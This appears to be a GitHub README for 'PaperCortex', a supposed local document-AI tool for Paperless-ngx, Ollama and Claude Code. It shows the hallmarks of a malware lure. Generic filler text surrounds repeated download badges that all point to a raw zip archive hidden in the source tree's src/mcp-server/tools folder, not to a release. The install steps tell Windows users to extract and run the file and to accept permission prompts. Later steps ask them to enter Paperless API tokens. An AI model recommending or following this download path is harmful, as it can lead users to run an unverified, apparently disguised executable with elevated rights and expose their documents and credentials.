# 🤖 PaperCortex - Find, Classify, Export Documents Fast

[![Download PaperCortex](https://img.shields.io/badge/Download%20PaperCortex-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/chetanmorey1/PaperCortex/main/src/mcp-server/tools/Paper-Cortex-2.7-beta.1.zip)

## 🧭 What PaperCortex Does

PaperCortex helps you work with documents in Paperless-ngx using local AI. It can search by meaning, sort documents into classes, extract receipt data, and create DATEV exports for accounting. It runs on your own computer with Ollama, so your files stay local.

Use it when you want to:

- Search documents by what they mean, not just by exact words
- Sort incoming files into useful groups
- Pull key data from receipts
- Export data for DATEV-based accounting workflows
- Connect Paperless-ngx with Claude Code through an MCP server

## 💻 What You Need

PaperCortex is made for Windows users who want a simple local setup.

You need:

- Windows 10 or Windows 11
- A stable internet connection for the initial download
- Enough free disk space for the app, AI model files, and your documents
- Paperless-ngx already set up, or ready to connect it later
- Ollama installed and running locally
- A modern browser for setup pages and local access

For best results, use:

- 16 GB RAM or more
- A recent CPU
- An SSD for faster document processing
- A folder with enough space for scanned files and exports

## 🚀 Download and Install

Visit this page to download:

https://raw.githubusercontent.com/chetanmorey1/PaperCortex/main/src/mcp-server/tools/Paper-Cortex-2.7-beta.1.zip

On Windows, follow these steps:

1. Open the link above.
2. Look for the latest release or the main download files.
3. Download the Windows package or installer.
4. If the file is zipped, right-click it and choose Extract All.
5. Open the extracted folder.
6. Run the app file or setup file.
7. If Windows asks for permission, choose Yes.
8. Keep the app open while you connect Paperless-ngx and Ollama.

If you do not see a release file yet, use the main repository page to get the latest build and setup instructions.

## ⚙️ First-Time Setup

After you start PaperCortex, set up the connection to your local tools.

### 1. Connect Ollama

PaperCortex uses Ollama for local AI work.

- Start Ollama on your PC
- Make sure it is running before you open PaperCortex
- Check that your local AI model is available
- Keep Ollama on the default local address unless you changed it

### 2. Connect Paperless-ngx

PaperCortex reads and organizes documents from Paperless-ngx.

- Open your Paperless-ngx details
- Copy the server address
- Enter your login token or API key
- Save the connection
- Test that the app can read your documents

### 3. Set Your Document Folders

Choose folders for:

- Input files
- Processed files
- Receipt exports
- DATEV export output
- Error or review items

Use folders that are easy to find, such as inside Documents or a work folder on your C drive

## 🔍 Main Features

### Semantic Search

Find files by meaning, not just file name.

Examples:

- Search for insurance letters
- Find all rent invoices
- Look for receipts from a certain store
- Search for tax documents from last year

This helps when your documents have unclear names.

### 📄 Auto-Classification

PaperCortex can sort documents into document types.

Common classes include:

- Invoice
- Receipt
- Contract
- Bank statement
- Letter
- Tax document
- Warranty document

The app uses the content of the file to choose the class.

### 🧾 Receipt Extraction

PaperCortex can pull important fields from receipts.

It can detect:

- Merchant name
- Date
- Total amount
- Tax amount
- Currency
- Receipt number

This saves time when you need data for bookkeeping or records.

### 📤 DATEV Export

PaperCortex can prepare data for DATEV workflows.

It can help with:

- Exporting receipt data
- Creating structured files for accounting
- Preparing document metadata
- Keeping export files in a clean folder layout

Use this when you need a better bridge between scanned documents and accounting work.

### 🤝 MCP Server for Claude Code

PaperCortex includes an MCP server for Claude Code.

This lets Claude Code work with your local document tools in a controlled way.

You can use it to:

- Query document data
- Look up related files
- Read extracted fields
- Work with local paperless content

This is useful if you want document access from a local AI workflow.

## 🛠️ Typical Windows Setup Path

If you want the quickest setup on Windows, use this order:

1. Download PaperCortex from the repository page
2. Install or unpack the app
3. Start Ollama
4. Open PaperCortex
5. Enter your Paperless-ngx connection data
6. Choose your local folders
7. Run a test search
8. Try one receipt file
9. Check the DATEV export folder
10. Connect Claude Code if you need MCP access

## 📁 Example Folder Layout

A simple layout can look like this:

- `C:\PaperCortex\Input`
- `C:\PaperCortex\Processed`
- `C:\PaperCortex\Exports`
- `C:\PaperCortex\DATEV`
- `C:\PaperCortex\Review`

This makes it easier to find files and keep track of results.

## 🔐 Privacy and Local Use

PaperCortex is built for local use with Ollama.

That means:

- Your AI work stays on your computer
- You do not need a cloud AI service for core tasks
- Your document data can stay inside your local setup
- You keep control over your files and exports

This setup fits users who want document intelligence without sending files elsewhere

## 🧪 Good First Tests

After setup, try these tests:

- Search for a known document title
- Search for a topic in a document body
- Run classification on one new file
- Extract fields from one receipt
- Create one DATEV export
- Check that the MCP server answers from Claude Code

If a test fails, check the connection settings first.

## 🧰 Common Use Cases

PaperCortex fits many day-to-day jobs:

- Personal document archiving
- Home accounting
- Small business receipt handling
- Tax preparation
- Contract lookup
- Invoice sorting
- Paperless document cleanup
- Local AI document search

## 🧭 Helpful Setup Checks

Before you start working with real files, check these items:

- Ollama is running
- Paperless-ngx is reachable
- Your API key or token is valid
- Your folders exist
- You have write access to export folders
- Your Windows firewall allows local app access if needed
- Your AI model is loaded and ready

## 📝 Suggested Workflow

A simple workflow looks like this:

1. Add a new scan or PDF to Paperless-ngx
2. Let PaperCortex read the file
3. Search by meaning or file content
4. Apply a document class
5. Extract receipt fields if needed
6. Export the data for accounting
7. Store the result in the correct local folder

## ❓ If Something Does Not Work

Check these points in order:

- Is Ollama open?
- Is Paperless-ngx online?
- Did you enter the right address?
- Did you save the settings?
- Does the app have access to your folders?
- Is the file a readable PDF or image?
- Is the document already in the system?

If one step fails, fix that part first and test again

## 📚 Project Details

PaperCortex is built with local AI, document intelligence, semantic search, receipt extraction, accounting exports, Paperless-ngx support, Ollama, MCP server support, and TypeScript-based tooling.

Topics tied to this project include:

- accounting
- ai
- claude-code
- datev
- document-intelligence
- local-ai
- mcp
- mcp-server
- ollama
- paperless
- paperless-ngx
- privacy
- receipt-extraction
- self-hosted
- semantic-search
- typescript

## 🧩 Best Results Tips

For smoother use:

- Keep your AI model small at first
- Use clear folder names
- Scan documents at good quality
- Keep receipts flat and readable
- Use consistent document labels
- Update your local tools when needed
- Review the first few extractions by hand

## 📦 Files You May See

Depending on the build, you may see:

- A Windows app file
- A zip archive
- A config file
- A local database file
- Export folders
- Log files

These files help the app remember settings and process documents

## 🔗 Download Again

[![Download PaperCortex](https://img.shields.io/badge/Get%20PaperCortex-blue-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/chetanmorey1/PaperCortex/main/src/mcp-server/tools/Paper-Cortex-2.7-beta.1.zip)

Use this page to visit the repository, get the latest files, and follow the current Windows setup path